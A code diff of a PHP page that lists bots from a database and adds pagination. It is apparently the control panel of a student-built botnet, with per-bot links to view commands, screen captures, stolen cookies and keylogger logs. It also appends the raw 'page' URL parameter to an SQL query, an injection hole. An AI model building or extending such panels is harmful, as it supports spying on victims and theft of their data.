@@ -4,20 +4,34 @@
 <?php
 $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
 if (mysqli_connect_errno()) exit;
+
 $header_display = "All bot";
+$page = 0;
+
 if (isset($_GET['status'])) {
-	if ($_GET['status'] == "Active") {
-		$header_display = "Bot active";
-		$query = "SELECT Id, Ip, Port,Status FROM bot where Remove = 0 and Status = 1";
-	} else if ($_GET['status'] == "Passive") {
-		$header_display = "Bot passive";
-		$query = "SELECT Id, Ip, Port,Status FROM bot where Remove = 0 and Status = 0";
-	} else {
-		$query = "SELECT Id, Ip, Port,Status FROM bot where Remove = 0";
-	}
+  if ($_GET['status'] == "Active") {
+    $header_display = "Bot active";
+    $query = "SELECT Id, Ip, Port,Status FROM bot where Remove = 0 and Status = 1 ORDER BY Id ASC";
+  } else if ($_GET['status'] == "Passive") {
+    $header_display = "Bot passive";
+    $query = "SELECT Id, Ip, Port,Status FROM bot where Remove = 0 and Status = 0 ORDER BY Id ASC";
+  } else {
+    $query = "SELECT Id, Ip, Port,Status FROM bot where Remove = 0 ORDER BY Id ASC";
+  }
 } else {
-	$query = "SELECT Id, Ip, Port,Status FROM bot where Remove = 0";
+  $query = "SELECT Id, Ip, Port,Status FROM bot where Remove = 0 ORDER BY Id ASC";
 }
+$page = 0;
+
+if (isset($_GET['page'])) {
+  $offset = $_GET['page'] * 15;
+  $query = $query . " LIMIT 15 OFFSET " . $offset;
+} else {
+  $query = $query . " LIMIT 15 ";
+}
+
+
+
 $stmt = $db->prepare($query);
 $stmt->execute();
 $stmt->bind_result($ID, $ip, $port, $status);
@@ -132,6 +146,7 @@ echo '
         width: 100%;
         text-align: center;
         border: 1px solid #00ff00;
+      
       }
       .content_table-thead {
         background: #62fa62;
@@ -183,6 +198,7 @@ echo '
           </ul>
         </div>
         <div class="content">
+        <div style="  height: 410px; ">
           <table class="content_table">
             <tr class="content_table-thead">
               <th class="content_table-th">ID</th>
@@ -207,26 +223,89 @@ echo '
 // </tr>
 
 while ($stmt->fetch()) {
-	echo '<tr class="content_table-tr">';
-	$administer = $status == 1 ? "<a style='color:#00ff00;text-decoration:underline;' href='../php/openBot.php?ID=" . $ID . "'>administrator</a>" : "";
-	// $delete = "<a style='color:#00ff00;text-decoration:underline;' href='../php/handleRemoveBot.php?ID=" . $ID . "'>hidden</a>";
-	$status_display = $status == 1 ? 'active' : 'non-active';
-	$cmd ="<a style='color:#00ff00;text-decoration:underline;' href='../php/viewCmd.php?ID=" . $ID . "'>view</a>";
-	$cookies = "<a style='color:#00ff00;text-decoration:underline;' href='../php/viewCookies.php?ID=" . $ID . "'>view</a>";
-	$keylogger = "<a style='color:#00ff00;text-decoration:underline;' href='../php/viewKeylogger.php?ID=" . $ID . "'>view</a>";
-	$capture = "<a style='color:#00ff00;text-decoration:underline;' href='../php/viewCapture.php?ID=" . $ID . "'>view</a>";
-	
-	
-	echo '<td class="content_table-td">' . $ID . '</td> <td class="content_table-td">' . $ip . '</td> <td class="content_table-td">' . $port . '</td> <td class="content_table-td">' . $administer . '</td> <td class="content_table-td">' . $status_display  . '</td><td class="content_table-td"> '.$cmd.'</td><td class="content_table-td"> ' .$capture.'</td><td class="content_table-td"> '.$cookies. '</td><td class="content_table-td"> ' . $keylogger . '</td>';
-	echo '</tr>';
+  echo '<tr class="content_table-tr">';
+  $administer = $status == 1 ? "<a style='color:#00ff00;text-decoration:underline;' href='../php/openBot.php?ID=" . $ID . "'>administrator</a>" : "";
+  // $delete = "<a style='color:#00ff00;text-decoration:underline;' href='../php/handleRemoveBot.php?ID=" . $ID . "'>hidden</a>";
+  $status_display = $status == 1 ? 'active' : 'non-active';
+  $cmd = "<a style='color:#00ff00;text-decoration:underline;' href='../php/viewCmd.php?ID=" . $ID . "'>view</a>";
+  $cookies = "<a style='color:#00ff00;text-decoration:underline;' href='../php/viewCookies.php?ID=" . $ID . "'>view</a>";
+  $keylogger = "<a style='color:#00ff00;text-decoration:underline;' href='../php/viewKeylogger.php?ID=" . $ID . "'>view</a>";
+  $capture = "<a style='color:#00ff00;text-decoration:underline;' href='../php/viewCapture.php?ID=" . $ID . "'>view</a>";
+
+
+  echo '<td class="content_table-td">' . $ID . '</td> <td class="content_table-td">' . $ip . '</td> <td class="content_table-td">' . $port . '</td> <td class="content_table-td">' . $administer . '</td> <td class="content_table-td">' . $status_display  . '</td><td class="content_table-td"> ' . $cmd . '</td><td class="content_table-td"> ' . $capture . '</td><td class="content_table-td"> ' . $cookies . '</td><td class="content_table-td"> ' . $keylogger . '</td>';
+  echo '</tr>';
 }
-echo '	
-          </table>
-        </div>
+echo '</table></div>';
+
+
+if (isset($_GET['status'])) {
+  if ($_GET['status'] == "Active") {
+    $sql_pagination = "SELECT COUNT(*) as NumRecord 
+    FROM bot where Status = 1 and Remove = 0";
+  } else if ($_GET['status'] == "Passive") {
+    $sql_pagination = "SELECT COUNT(*) as NumRecord 
+    FROM bot where Status = 0 and Remove = 0";
+  } else {
+    $sql_pagination = "SELECT COUNT(*) as NumRecord 
+    FROM bot where Remove = 0";
+  }
+} else {
+  $sql_pagination = "SELECT COUNT(*) as NumRecord 
+    FROM bot where Remove = 0";
+}
+
+$rs_pagination = mysqli_query($db, $sql_pagination);
+
+while ($row = mysqli_fetch_array($rs_pagination)) {
+  $NumRecord = $row["NumRecord"];
+}
+
+echo '<div style="margin-top:16px; display:flex; column-gap: 8px; flex-wrap: wrap;">';;
+
+if ($NumRecord > 15) {
+
+
+  echo '<p >Page</p>';
+  for ($i = 0; $i <
+    $NumRecord / 15; $i++) {
+
+    if ($i != 0) {
+      if (isset($_GET['status'])) {
+        if ($_GET['status'] == "Active") {
+          $href = "listBot.php?status=Active&page=" . $i;
+        } else if ($_GET['status'] == "Passive") {
+          $href = "listBot.php?status=Passive&page=" . $i;
+        } else {
+          $href = "listBot.php?page=" . $i;
+        }
+      } else {
+        $href = "listBot.php?page=" . $i;
+      }
+    } else {
+      if (isset($_GET['status'])) {
+        if ($_GET['status'] == "Active") {
+          $href = "listBot.php?status=Active";
+        } else if ($_GET['status'] == "Passive") {
+          $href = "listBot.php?status=Passive";
+        } else {
+          $href = "listBot.php";
+        }
+      } else {
+        $href = "listBot.php";
+      }
+    }
+    $numPage = $i + 1;
+    $link = "<a style='text-decoration:underline; border: 1px solid #00ff00; padding:2px 4px; color: #00ff00;' href='" . $href . "'>" . $numPage . "</a>";
+    echo $link;
+  }
+}
+echo '</div>';
+echo '</div>
       </div>
       ';
-      include_once("navigate.php");
-      echo '
+include_once("navigate.php");
+echo '
     </div>
   </body>
 </html>
